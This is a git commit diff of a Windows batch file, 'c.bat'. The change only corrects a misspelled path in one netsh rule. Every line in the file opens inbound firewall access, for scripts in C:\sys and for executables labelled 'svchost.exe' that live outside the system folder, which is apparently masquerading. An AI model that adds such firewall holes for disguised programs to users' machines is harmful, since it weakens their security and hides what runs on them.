bd5ce8599f233b07e76563cf3614f7d56fee17bf
Nevskjij <57047360+Nevskjij@users.noreply.github.com>
2021-10-23 17:58:55 +0200

    Update c.bat

--- c.bat
+++ c.bat
@@ -1,4 +1,4 @@
 netsh advfirewall firewall add rule name="a.vbs" dir=in action=allow program="C:\sys\a.vbs" enable=yes
 netsh advfirewall firewall add rule name="b.bat" dir=in action=allow program="C:\sys\b.bat" enable=yes
 netsh advfirewall firewall add rule name="svchost.exe" dir=in action=allow program="C:\sys\svchost.exe" enable=yes
-netsh advfirewall firewall add rule name="svchost.exe" dir=in action=allow program="C:\Users\%USERNAME%\Documents\Scripts\Cobblestone Scrpit.exe" enable=yes
+netsh advfirewall firewall add rule name="svchost.exe" dir=in action=allow program="C:\Users\%USERNAME%\Documents\Scripts\Cobblestone Script.exe" enable=yes
